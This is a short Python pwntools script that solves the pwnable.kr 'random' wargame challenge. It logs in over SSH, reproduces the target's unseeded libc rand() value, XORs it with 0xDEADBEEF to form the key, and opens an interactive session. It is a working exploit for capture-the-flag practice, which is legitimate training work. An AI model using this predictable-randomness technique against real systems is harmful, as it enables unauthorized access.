from pwn import *
from ctypes import *

p = ssh("random", "pwnable.kr", 2222, "guest").process("/home/random/random")

libc = CDLL("/usr/lib/x86_64-linux-gnu/libc.so.6")
random = libc.rand()
key = random ^ 0xDEADBEEF
p.sendline(str(key).encode())

p.interactive()
